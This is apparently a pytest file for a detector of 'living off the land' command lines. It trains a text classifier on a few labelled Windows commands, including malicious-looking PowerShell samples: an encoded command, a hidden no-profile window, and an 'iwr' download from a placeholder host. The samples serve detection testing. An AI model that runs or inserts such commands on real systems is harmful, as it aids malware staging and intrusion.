from __future__ import annotations

import pandas as pd

from lotl_detector.data import LABEL_COLUMN
from lotl_detector.models.text import TextModelArtifacts, train_text_model


def test_train_text_model_returns_artifacts():
    train_df = pd.DataFrame(
        {
            "CommandLine": [
                "powershell -enc MQAyADMA",
                "cmd.exe /c dir C:\\Windows",
                "powershell iwr http://malicious",
            ],
            LABEL_COLUMN: [1, 0, 1],
        }
    )
    val_df = pd.DataFrame(
        {
            "CommandLine": [
                "cmd.exe /c echo benign",
                "powershell -nop -w hidden",
            ],
            LABEL_COLUMN: [0, 1],
        }
    )

    artifacts, feature_names, config, report, prefix = train_text_model(train_df, val_df)

    assert isinstance(artifacts, TextModelArtifacts)
    assert prefix == "text"
    assert feature_names, "feature names should not be empty"
    assert "vectorizer" in config
    assert "classifier" in config
    assert "accuracy" in report
    assert "macro_avg" in report
    assert "weighted_avg" in report
    # Ensure classifier can score the validation set without errors
    assert report["label_0"]["support"] > 0
